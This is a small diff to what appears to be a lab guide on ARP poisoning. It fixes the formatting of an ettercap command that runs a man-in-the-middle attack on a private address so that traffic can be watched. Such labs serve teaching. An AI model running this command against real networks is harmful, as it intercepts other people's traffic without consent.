@@ -54,7 +54,7 @@ To perform ARP poisoning and intercept data:
 
 2. Run `ettercap` to perform a MITM attack:
    ```bash
-    sudo ettercap -T -M arp ///172.24.0.2```
+    sudo ettercap -T -M arp ///172.24.0.2
 
 4. Watch the intercepted traffic in real-time within the terminal.
 
